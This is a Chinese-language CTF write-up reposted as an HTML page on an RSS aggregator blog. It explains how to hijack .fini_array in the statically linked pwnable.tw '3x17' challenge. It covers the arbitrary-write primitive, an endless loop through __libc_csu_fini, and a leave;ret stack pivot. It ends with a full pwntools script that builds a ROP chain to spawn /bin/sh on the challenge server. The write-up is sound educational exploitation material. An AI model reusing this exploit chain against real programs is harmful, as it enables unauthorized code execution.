@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+  <meta name="generator" content="Hexo 6.3.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="dns-prefetch" href="https://fastly.jsdelivr.net">
+  <link rel="preconnect" href="https://fastly.jsdelivr.net" crossorigin>
+  <link rel="dns-prefetch" href="//unpkg.com">
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>从 pwnable.tw——3x17 学习 .Fini_array - RSSBOX</title>
+
+  
+    <meta name="description" content="尽管 pwnable.tw已经很久没更新新题，这上面的题目放到现在对我而言也仍然是很有趣的。在解 3x17 这道题的时候，用到了之前从没用过的 fini_array hijack，因此记录一下。预分析checksec 结果：12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从 pwnable.tw——3x17 学习 .Fini_array">
+<meta property="og:url" content="https://rssbox.mhuig.top/rss/450a7f11.html">
+<meta property="og:site_name" content="RSSBOX">
+<meta property="og:description" content="尽管 pwnable.tw已经很久没更新新题，这上面的题目放到现在对我而言也仍然是很有趣的。在解 3x17 这道题的时候，用到了之前从没用过的 fini_array hijack，因此记录一下。预分析checksec 结果：12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-06-19T06:00:00.000Z">
+<meta property="article:modified_time" content="2024-06-19T06:00:00.000Z">
+<meta property="article:author" content="MHuiG">
+<meta property="article:tag" content="友链">
+<meta property="article:tag" content="bowenyoung">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="RSSBOX" type="application/atom+xml">
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+
+  
+
+
+  
+</head>
+
+<body>
+  
+
+
+
+
+  <div class="l_body" id="start">
+    <aside class="l_left" layout="post">
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" target="_blank" rel="noopener" href="https://mhuig.top/"><div class="bg" style="opacity:0;background-image:url(https://static.mhuig.top/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://static.mhuig.top/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">RSSBOX</div><div class="sub normal cap">MHuiGのRSS订阅</div><div class="sub hover cap" style="opacity:0">rssbox.mhuig.top</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">RSS</a><a class="nav-item" target="_blank" rel="noopener" href="https://blog.mhuig.top/">博客</a><a class="nav-item" target="_blank" rel="noopener" href="https://mhuig.top/">关于</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E5%88%86%E6%9E%90"><span class="toc-text">预分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%8A%9F%E8%83%BD%E5%88%86%E6%9E%90"><span class="toc-text">程序功能分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fini-array"><span class="toc-text">.fini_array</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E9%99%90%E5%BE%AA%E7%8E%AF"><span class="toc-text">无限循环</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AE%9A%E4%BD%8D-fini-array%E5%92%8C-libc-csu-fini-%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%9F"><span class="toc-text">如何定位.fini_array和__libc_csu_fini 的地址？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP"><span class="toc-text">ROP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-text">exploit</span></a></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/MHuiG" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://static.mhuig.top/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"></a><a class="social" href="https://music.163.com/#/user/home?id=63035382" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://static.mhuig.top/gh/cdn-x/placeholder@1.0.3/social/3845874.svg"></a><a class="social" href="/contact/" rel="noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://static.mhuig.top/gh/cdn-x/placeholder@1.0.3/social/a1b00e20f425d.svg"></a></div></footer>
+
+    </aside>
+    <div class="l_main">
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%8F%8B%E9%93%BE/">友链</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E5%8F%8B%E9%93%BE/bowenyoung/">bowenyoung</a></div><div id="post-meta">发布于&nbsp;<time datetime="2024-06-19T06:00:00.000Z">2024-06-19</time></div></div>
+
+<article class="content md post">
+<h1 class="article-title"><span>从 pwnable.tw——3x17 学习 .Fini_array</span></h1>
+<div>
+<p>尽管 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://pwnable.tw/challenge/">pwnable.tw</a>已经很久没更新新题，这上面的题目放到现在<del>对我而言</del>也仍然是很有趣的。在解 3x17 这道题的时候，用到了之前从没用过的 <strong>fini_array hijack</strong>，因此记录一下。</p><h2 id="预分析"><a class="headerlink" href="#预分析" title="预分析"></a>预分析</h2><p><code>checksec</code> 结果：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></tbody></table></figure><p><code>file</code> 结果：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3x17: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped</span><br></pre></td></tr></tbody></table></figure><ul><li>PIE 未启用：不用泄露程序基地址</li><li>canary 未启用：如果有栈溢出可以直接利用</li><li>静态链接：没有 libc</li></ul><h2 id="程序功能分析"><a class="headerlink" href="#程序功能分析" title="程序功能分析"></a>程序功能分析</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( byte_4B9330 == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  write_func(<span class="number">1u</span>, <span class="string">"addr:"</span>, <span class="number">5uLL</span>);</span><br><span class="line">  read_func(<span class="number">0</span>, buf, <span class="number">0x18</span>uLL);</span><br><span class="line">  v4 = (<span class="type">char</span> *)(<span class="type">int</span>)bytes_to_addr(buf);</span><br><span class="line">  write_func(<span class="number">1u</span>, <span class="string">"data:"</span>, <span class="number">5uLL</span>);</span><br><span class="line">  read_func(<span class="number">0</span>, v4, <span class="number">0x18</span>uLL);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></tbody></table></figure><p>程序很直接地提供了一次任意地址写的机会，又称 <strong>Write What Where (WWW)</strong> 。不过我们没有栈空间地址泄露，因此暂时无法直接利用栈来直接控制代码流。</p><p>GOT 表劫持？没有 <code>system</code> 函数。但是 <code>Partial RELRO</code> 可不仅仅意味着可以利用 GOT 表劫持，也意味着可以使用 <strong>fini_array 劫持</strong>。</p><h2 id="fini-array"><a class="headerlink" href="#fini-array" title=".fini_array"></a><code>.fini_array</code></h2><p><code>.fini_array</code> 是什么？简单来说，它是一个函数指针数组，一旦程序退出就会运行其中的函数，不过是按倒序方式，例如先运行 <code>.fini_array[1]</code> 再运行 <code>.fini_array[0]</code> 。只要我们能覆写该数组中的函数指针，我们就能劫持代码流。</p><h3 id="无限循环"><a class="headerlink" href="#无限循环" title="无限循环"></a>无限循环</h3><p>很多时候题目（例如这题）中的漏洞指利用一次是不够我们 capture the flag 的，因此我们需要达到漏洞的重复利用。以这题为例，我们可以构造：<code>.fini_array[0] == __libc_csu_fini &amp;&amp;.fini_array[1] == main</code></p><ol><li>当程序退出时，先执行 <code>main</code> 函数，任意写包含于其中（尽管会检查<code>0x4B9330</code>地址处是否为1，但其类型为 byte/uint8，因此<code>1+16 == 1</code>，我们不必担心）。</li><li>然后执行 <code>__libc_csu_fini</code> 函数。该函数的作用就是调用所有 <code>.fini_array</code> 中的函数，于是回到步骤1。因此形成了无限循环。</li></ol><h3 id="如何定位-fini-array和-libc-csu-fini-的地址？"><a class="headerlink" href="#如何定位-fini-array和-libc-csu-fini-的地址？" title="如何定位.fini_array和__libc_csu_fini 的地址？"></a>如何定位<code>.fini_array</code>和<code>__libc_csu_fini</code> 的地址？</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -S ./3x17 | grep .fini_array</span><br></pre></td></tr></tbody></table></figure><p><code>-S</code> 可以显示各个段的 header 。</p><p>在 <code>start</code> 函数中找到：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sub_401EB0(</span><br><span class="line">  (<span class="type">unsigned</span> <span class="type">int</span>)main,</span><br><span class="line">  v4,</span><br><span class="line">  (<span class="type">unsigned</span> <span class="type">int</span>)&amp;retaddr,</span><br><span class="line">  (<span class="type">unsigned</span> <span class="type">int</span>)sub_4028D0,</span><br><span class="line">  (<span class="type">unsigned</span> <span class="type">int</span>)sub_402960,</span><br><span class="line">  a3,</span><br><span class="line">  (__int64)&amp;v5);</span><br><span class="line">__halt();</span><br></pre></td></tr></tbody></table></figure><pre><code># in the `start`, there is a `_libc_start_main`# the `_libc_start_main`'s 4th and 5th arg is `_libc_csu_init`, `_libc_csu_fini`</code></pre><p>根据经验<code>sub_401EB0</code>为<code>__libc_start_main</code>，而<code>__libc_start_main</code> 的第 4 和第 5 个参数分别是 <code>__libc_csu_init</code> 和 <code>__libc_csu_fini</code>。</p><h2 id="ROP"><a class="headerlink" href="#ROP" title="ROP"></a>ROP</h2><p>我们现在拥有了无限次任意地址写的机会，也知道如何利用 <code>.fini_array</code> 来劫持代码流，接下来做什么？</p><p>首先，静态链接的 ELF 最不缺的就是 gadgets。我们很容易找到 pop 各种寄存器以及 <code>syscall</code> 的 gadgets。很容易构造 ROP chain 。那么离 get shell 就只差——栈。</p><p>我们需要将 ROP chain 放到栈上去。<code>__libc_csu_fini</code> 函数为我们创造了条件：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">lea     rax, unk_4B4100</span><br><span class="line">lea     rbp, off_4B40F0</span><br><span class="line">push    rbx</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><p>以上是 <code>__libc_csu_fini</code> 函数的开头，其中<code>lea rbp, off_4B40F0</code>中的<code>0x4B40F0</code>就是 <code>.fini_array</code> 的起始地址。换言之，在运行完 <code>__libc_csu_fini</code> 函数后，<code>rbp</code> 的值为 <code>.fini_array</code> 的起始地址。接下来只要利用 <code>leave ; ret</code> 就可以让返回地址为 <code>fini_array + 0x8</code>。因为 <code>leave == mov rsp, rbp ; pop rbp</code>。</p><ol><li><code>mov rsp, rbp</code> : <code>rsp = rbp = .fini_array</code></li><li><code>pop rbp</code> : <code>rbp = .fini_array[0]</code>, <code>rsp = .fini_array + 0x8</code> </li><li><code>ret</code> : <code>rip = rsp = .fini_array + 0x8</code></li></ol><p>因此只要令<code>.fini_array[0]</code> 处为<code>leave ; ret</code> gadget 的地址，且从<code>.fini_array + 0x8</code> 开始为 ROP chain 即可 get shell 。</p><h2 id="exploit"><a class="headerlink" href="#exploit" title="exploit"></a>exploit</h2><p>由于只是一道 150 分的题，根据 pwnable.tw 的规则可以公开代码用于参考：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">"./3x17"</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.DEBUG:</span><br><span class="line">            gdb.attach(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10105</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">www</span>(<span class="params">r,addr,data</span>):</span><br><span class="line">    r.sendafter(<span class="string">b"addr:"</span>,<span class="built_in">str</span>(addr).encode())</span><br><span class="line">    r.sendafter(<span class="string">b"data:"</span>,data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    args.LOCAL = <span class="literal">False</span></span><br><span class="line">    r = conn()</span><br><span class="line">    <span class="comment"># `readelf -S ./3x17` to find the addr of .fini_array</span></span><br><span class="line">    <span class="comment"># in the `start`, there is a `__libc_start_main`</span></span><br><span class="line">    <span class="comment"># the `__libc_start_main`'s 4th and 5th arg is `__libc_csu_init`, `__libc_csu_fini`</span></span><br><span class="line"></span><br><span class="line">    fini_array = <span class="number">0x4b40f0</span></span><br><span class="line">    libc_csu_fini = <span class="number">0x402960</span></span><br><span class="line">    main = <span class="number">0x401b6d</span></span><br><span class="line">    leave_ret_addr = <span class="number">0x401c4b</span></span><br><span class="line">    pop_rdi = <span class="number">0x401696</span></span><br><span class="line">    pop_rsi = <span class="number">0x406c30</span></span><br><span class="line">    pop_rdx = <span class="number">0x446e35</span></span><br><span class="line">    pop_rax = <span class="number">0x41e4af</span></span><br><span class="line">    syscall = <span class="number">0x4022b4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># stage1: eternal loop</span></span><br><span class="line">    www(r,fini_array,flat(libc_csu_fini,main))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># stage2: rop chain</span></span><br><span class="line">    www(r, fini_array + <span class="number">0x10</span>, flat(fini_array+<span class="number">0x50</span>, pop_rsi, <span class="number">0</span>))</span><br><span class="line">    www(r, fini_array + <span class="number">0x28</span>, flat(pop_rdx, <span class="number">0</span>, pop_rax))</span><br><span class="line">    www(r, fini_array + <span class="number">0x40</span>, flat(<span class="number">0x3b</span>, syscall) + <span class="string">b'/bin/sh\x00'</span>)</span><br><span class="line">    www(r, fini_array, flat(leave_ret_addr, pop_rdi))</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure>
+</div>
+
+<div>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="从 pwnable.tw——3x17 学习 .fini_array" href="https://blog.beacox.space/posts/fini_array/" target="_blank" rel="external nofollow noopener noreferrer"><div class="left"><span class="title">从 pwnable.tw——3x17 学习 .fini_array</span><span class="desc fs12">https://blog.beacox.space/posts/fini_array/</span></div><div class="right"><div class="lazy img" data-bg="https://static.mhuig.top/gh/cdn-x/placeholder@1.0.1/link/8f277b4ee0ecd.svg"></div></div></a></div>
+</div>
+
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/me-shaon/GLWTPL/blob/master/translations/LICENSE_zh-CN">GLWT（Good Luck With That，祝你好运）公共许可证</a> 许可协议。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>接下来阅读</span></section><section class="body fs14"><a id="next" href="/rss/e56975ed.html">使用 1panel 自动申请和续签通配符证书<span class="note">较早</span></a><div class="line"></div><a id="prev" href="/rss/c7e77ca8.html">手动清理C盘的空间<span class="note">较新</span></a></section></div>
+
+
+<div class="related-wrap reveal" id="related-posts">
+    <section class="header">
+      <div class="title cap theme">您可能感兴趣的文章</div>
+    </section>
+    <section class="body">
+    <div class="related-posts"><a class="item" href="/rss/a14edcac.html" title="CVE-2023-35720 华硕路由器SQL注入漏洞分析"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/08/16/66bf4e8550197.png"></div><span class="title">CVE-2023-35720 华硕路由器SQL注入漏洞分析</span></a><a class="item" href="/rss/84e43ba7.html" title="EOVS——企业运营仿真赛参赛记录"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2023/01/11/63beacf2cef5d.png"></div><span class="title">EOVS——企业运营仿真赛参赛记录</span></a><a class="item" href="/rss/9fc895a5.html" title="GTK应用开发小记"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2023/07/12/64ae07efdadeb.png"></div><span class="title">GTK应用开发小记</span></a><a class="item" href="/rss/1a8a57e4.html" title="TBTL CTF 2024 WriteUp"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/05/13/6641b5128b62e.png"></div><span class="title">TBTL CTF 2024 WriteUp</span></a><a class="item" href="/rss/18c9a5eb.html" title="TINY Scanner开发文档"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://github.githubassets.com/favicons/favicon.svg"></div><span class="title">TINY Scanner开发文档</span></a><a class="item" href="/rss/73a5cbdc.html" title="UIUCTF 2024 PWN Writeup"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/07/06/6689647325ffb.png"></div><span class="title">UIUCTF 2024 PWN Writeup</span></a><a class="item" href="/rss/6aa45fe.html" title="Windows PEB 利用"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/03/16/65f56cd47e02d.png"></div><span class="title">Windows PEB 利用</span></a><a class="item" href="/rss/afba8c2e.html" title="SJTU CTF 2024 暨 GEEKCTF 2024 WriteUp"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/04/26/662b492c58255.png"></div><span class="title">SJTU CTF 2024 暨 GEEKCTF 2024 WriteUp</span></a><a class="item" href="/rss/1275743e.html" title="《山河旅探》(Murders on the Yangtze River) 通关简评"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/02/16/65cf5c075dc14.jpg"></div><span class="title">《山河旅探》(Murders on the Yangtze River) 通关简评</span></a><a class="item" href="/rss/bb92ed01.html" title="Windows 更新降级攻击复现与分析"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2024/08/22/66c6d05fe3c3b.png"></div><span class="title">Windows 更新降级攻击复现与分析</span></a><a class="item" href="/rss/a34ac8df.html" title="沙箱与Docker"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://picsum.photos/400/300?random=7773"></div><span class="title">沙箱与Docker</span></a><a class="item" href="/rss/37c40255.html" title="终端自定义——StarShip"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2023/07/29/64c4ffaa041d6.png"></div><span class="title">终端自定义——StarShip</span></a><a class="item" href="/rss/46b69390.html" title="隐语开源Meetup一周年专场与会记录"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.beacox.space&url=https://bu.dusays.com/2023/07/22/64bbe1b38a067.jpg"></div><span class="title">隐语开源Meetup一周年专场与会记录</span></a><a class="item" href="/rss/59b16766.html" title="第十七届全国大学生信息安全竞赛创新实践能力赛初赛 Writeup"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" 